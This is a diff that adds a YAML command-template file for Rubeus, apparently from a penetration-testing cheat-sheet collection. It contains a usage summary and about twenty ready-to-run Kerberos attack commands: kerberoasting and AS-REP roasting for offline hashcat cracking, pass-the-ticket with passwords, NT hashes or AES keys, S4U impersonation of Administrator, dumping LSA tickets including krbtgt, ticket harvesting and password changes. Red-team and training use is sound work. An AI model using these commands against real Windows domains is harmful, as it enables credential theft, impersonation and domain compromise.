@@ -1,0 +1,79 @@
+---
+tool: rubeus
+description: Kerberos abuse on Windows with Rubeus
+notes: |
+  NAME
+      Rubeus - C# toolset for raw Kerberos interaction and abuse
+
+  SYNOPSIS
+      Rubeus.exe <action> [/arg:value ...]
+
+  DESCRIPTION
+      Runs on a Windows target to request, dump, forge and renew
+      Kerberos tickets. Roasting output (/format:hashcat) is cracked
+      offline with hashcat -m 13100 (kerberoast) or -m 18200 (asrep).
+      Tickets are base64 blobs; /ptt injects into the current logon
+      session, /nowrap keeps the blob on one line for copy-paste.
+
+  COMMON ACTIONS
+      kerberoast    roast SPN-enabled accounts (-m 13100)
+      asreproast    roast accounts with preauth disabled (-m 18200)
+      asktgt        request a TGT from creds / hash, optionally /ptt
+      s4u           constrained-delegation ticket impersonation
+      tgtdeleg      extract a usable TGT via the delegation trick
+      dump          dump tickets from LSA (needs elevation)
+      monitor       watch for new TGTs (e.g. after a coerced auth)
+      ptt / renew   inject or renew a ticket blob
+
+  CREDENTIAL ARGS
+      /password:  cleartext        /rc4: NT hash        /aes256: key
+      /ptt        inject the result into the current session
+      /nowrap     emit base64 without line wrapping
+
+  EXAMPLES
+      Rubeus.exe kerberoast /format:hashcat /nowrap /outfile:roast.txt
+      Rubeus.exe asktgt /user:svc /rc4:<NT> /domain:corp.local /ptt
+
+actions:
+  - title: kerberoast
+    command: "Rubeus.exe kerberoast /format:hashcat /nowrap /outfile:roast.txt"
+  - title: kerberoast-user
+    command: "Rubeus.exe kerberoast /user:{{ user | default('svc') }} /format:hashcat /nowrap /outfile:roast.txt"
+  - title: kerberoast-creds
+    command: "Rubeus.exe kerberoast /creduser:{{dn}}\\{{un}} /credpassword:'{{pw}}' /format:hashcat /nowrap /outfile:roast.txt"
+  - title: asreproast
+    command: "Rubeus.exe asreproast /format:hashcat /nowrap /outfile:asrep.txt"
+  - title: asreproast-user
+    command: "Rubeus.exe asreproast /user:{{ user | default('svc') }} /format:hashcat /nowrap /outfile:asrep.txt"
+  - title: asktgt-password
+    command: "Rubeus.exe asktgt /user:{{un}} /password:'{{pw}}' /domain:{{dn}} /dc:{{ dc | default(rhost) }} /ptt"
+  - title: asktgt-rc4
+    command: "Rubeus.exe asktgt /user:{{un}} /rc4:{{hash}} /domain:{{dn}} /dc:{{ dc | default(rhost) }} /ptt"
+  - title: asktgt-aes256
+    command: "Rubeus.exe asktgt /user:{{un}} /aes256:{{aes256}} /domain:{{dn}} /dc:{{ dc | default(rhost) }} /ptt"
+  - title: asktgs
+    command: "Rubeus.exe asktgs /ticket:{{ ticket | default('BASE64_TGT') }} /service:{{ spn | default('cifs/host.corp.local') }} /dc:{{ dc | default(rhost) }} /ptt"
+  - title: s4u
+    command: "Rubeus.exe s4u /user:{{un}} /rc4:{{hash}} /impersonateuser:{{ impersonate | default('Administrator') }} /msdsspn:{{ spn | default('cifs/host.corp.local') }} /domain:{{dn}} /dc:{{ dc | default(rhost) }} /ptt"
+  - title: tgtdeleg
+    command: "Rubeus.exe tgtdeleg /nowrap"
+  - title: dump
+    command: "Rubeus.exe dump /nowrap"
+  - title: dump-service
+    command: "Rubeus.exe dump /service:krbtgt /nowrap"
+  - title: triage
+    command: "Rubeus.exe triage"
+  - title: klist
+    command: "Rubeus.exe klist"
+  - title: monitor
+    command: "Rubeus.exe monitor /interval:5 /nowrap"
+  - title: harvest
+    command: "Rubeus.exe harvest /interval:30"
+  - title: ptt
+    command: "Rubeus.exe ptt /ticket:{{ ticket | default('BASE64_TICKET') }}"
+  - title: renew
+    command: "Rubeus.exe renew /ticket:{{ ticket | default('BASE64_TGT') }} /ptt"
+  - title: hash
+    command: "Rubeus.exe hash /password:'{{pw}}' /user:{{un}} /domain:{{dn}}"
+  - title: changepw
+    command: "Rubeus.exe changepw /ticket:{{ ticket | default('BASE64_TGT') }} /new:'{{ newpw | default('Password123!') }}' /dc:{{ dc | default(rhost) }}"
